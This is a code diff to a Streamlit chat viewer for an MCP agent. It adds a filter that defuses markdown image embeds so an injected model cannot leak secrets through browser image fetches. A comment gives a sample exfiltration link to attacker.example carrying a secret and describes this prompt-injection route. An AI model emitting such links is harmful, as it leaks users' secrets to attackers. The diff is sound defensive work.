@@ -12,11 +12,37 @@ suite green.
 
 from __future__ import annotations
 
+import re
 from typing import Any
 
 import streamlit as st
 
 from mcp_agent.turns import TurnEvent
+
+#: Markdown image syntax. Streamlit renders it as an `<img>`, which the
+#: viewer's browser fetches without anyone clicking — so a model that has been
+#: talked into writing `![](https://attacker.example/?k=SECRET)` has an egress
+#: channel that no sandbox closes, because the request leaves the browser and
+#: not the container. Links are left alone: they need a click, and stripping
+#: them would cost the model its ability to cite anything.
+_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
+
+
+def without_images(text: str) -> str:
+    """Assistant text with image embeds defused, keeping their alt text.
+
+    The shell sandbox has no network, which closes the *command's* route out.
+    This closes the reply's. Both halves are needed for the claim that 0.5.0
+    answers the injection path 0.2.0 removed the shipped shell over — a
+    security review found the second half open while the module docstring
+    asserted it was shut.
+    """
+
+    def defuse(match: re.Match[str]) -> str:
+        alt = match.group(1)
+        return f"[image: {alt}]" if alt else "[image]"
+
+    return _IMAGE.sub(defuse, text)
 
 
 def draw(event: TurnEvent, text_placeholder: Any, tool_placeholder: Any) -> None:
@@ -27,7 +53,7 @@ def draw(event: TurnEvent, text_placeholder: Any, tool_placeholder: Any) -> None
     drawing from there raises on every write.
     """
     if event.kind == "text":
-        text_placeholder.markdown(event.payload)
+        text_placeholder.markdown(without_images(event.payload))
         return
 
     with tool_placeholder.expander("🔧 Tool Call Information", expanded=True):
